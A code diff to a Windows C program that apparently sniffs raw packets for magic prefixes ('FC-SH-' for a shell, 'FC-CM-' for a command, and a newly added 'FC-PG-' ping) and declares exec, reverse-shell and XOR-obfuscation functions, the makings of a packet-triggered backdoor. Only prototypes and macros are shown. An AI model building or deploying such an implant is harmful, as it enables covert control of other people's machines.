@@ -8,7 +8,11 @@
 #include <winsock2.h>
 #include <mstcpip.h>
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ws2_32")
+// #pragma comment(lib, "rpcrt4")
+
+// extern struct GUID id;
+static struct sockaddr_in* localaddr;
 
 struct icmp_hdr_s {
 	uint8_t type;
@@ -50,11 +54,12 @@ struct ip_hdr_s {
 	uint32_t 	ip_dst;
 };
 
-void handleTCP(char*, struct ip_hdr_s*);
-void handleUDP(char*, struct ip_hdr_s*);
-void handleICMP(char*, struct ip_hdr_s*);
-void compare(int, char*);
+void handleTCP(char*, struct ip_hdr_s*, struct sockaddr_in*);
+void handleUDP(char*, struct ip_hdr_s*, struct sockaddr_in*);
+void handleICMP(char*, struct ip_hdr_s*, struct sockaddr_in*);
+void compare(int, char*, struct sockaddr_in*);
 void rev(char*);
+void ping(char*);
 void exec(char*);
 void XORCipher(char*, int, int);
 struct sockaddr_in* getIP();
@@ -75,6 +80,7 @@ struct sockaddr_in* getIP();
 
 #define SHELL 		"FC-SH-"
 #define COMMAND 	"FC-CM-"
+#define PING 		"FC-PG-"
 
 #define XOR_KEY 	0x10
 
